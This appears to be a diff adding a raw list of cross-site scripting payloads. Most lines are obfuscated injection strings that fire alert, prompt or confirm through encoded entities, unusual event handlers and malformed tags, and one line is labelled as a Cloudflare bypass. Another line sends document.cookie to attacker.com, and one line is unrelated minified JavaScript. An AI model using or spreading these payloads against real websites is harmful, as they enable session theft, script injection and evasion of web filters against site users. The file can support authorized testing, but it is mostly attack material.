@@ -1,0 +1,35 @@
+javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.cookie
+<img%20id=%26%23x101;%20src=x%20onerror=%26%23x101;;alert`1`;><svg%0Aonauxclick=0;[1].some(confirm)//
+%3E%3Csvg onmouseover%3d”confirm(1"/%3E
+%22%3E%3Csvg%20onmouseover%3d%22confirm%26%230000000040document.domain
+"onx=() onmouseover=prompt(1)>
+" onxXxxXXxXXXxx=() autofocus onmouseover=prompt(1)>
+"onx={} onmouseover=prompt(1)>
+"onx=[] onmouseover=prompt(1)>
+<a href=&#01javascript:alert(1)>
+<a href=javascript&colon;confirm(1)>
+<a href="jav%0Dascript&colon;alert(1)">
+<image src\r\n=valid.jpg onloadend='new class extends (co\u006efir\u006d)/**/`` &lcub;&rcub;'>
+<img src onerror=%26emsp;prompt`${document.domain}`>
+<svg/onload=%26nbsp;alert`bohdan`+1'"><img/src/onerror=.1|alert``>
+<svg onload="import('data:text/javascript,al'+''+'ert(0)')">
+<script>x = '<!--<script>'/*</script>-->*/;alert(1)</script>
+<img src onerror=%26emsp;prompt`${document.domain}`>
+<--`<img/src=` onerror=confirm``> --!>
+“><svg/on</script>laod=alert>
+<a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;">X</a>
+<svg%0Aonauxclick=0;[1].some(confirm)//
+<a"/onclick=(confirm)()>Click Here!
+xss'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>
+</Scrpt/"%27--!>%20<Scrpt>%20confirm(1)%20</Scrpt>
+{` <body \< onscroll =1(_=prompt,_(String.fromCharCode(88,83,83,32,66,121,32,77,111,114,112,104,105,110,101)))> ´}
+%3Cimg src='null' onerror=alert('murphyy')%3E
+%27;%0d%0d});%0d{onerror=prompt}throw document.location</ScRipT//
+<a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;">X</a>
+%3Cp%20style=overflow:auto;font-size:999px%20onscroll=x=location=%27http://attacker.com?cookie=%27+document.cookie%3EAAA%3Cx/id=y%3E%3C/p%3E
+<a"/onmouseover=(confirm)('clodflare-bypass-doskey_history')>click
+"/><frostnull+onmousemove/=alert`xss`+"<">frostnull<!--
+"><!'/*"*\'/*\"/*--></Script><Image SrcSet=K */; OnError=confirm(document.domain) //>#
+javascript:{alert ‘0’ }
+for(t?c.outerHTmL=o:i=o=’’;i++<1024;o+=`<code onclick=this.innerHTmL=’${M(i)?’*’:n||’·’}’>#</code>${i%64?’’:’<p>’}`)for(n=j=0;j<9;n+=M(i-65+j%3+(j++/3|0)*64))M=i=>i>64&i<960&i%64>1&C(i*i)>.7
+<svg/OnLoad="`${prompt``}`">
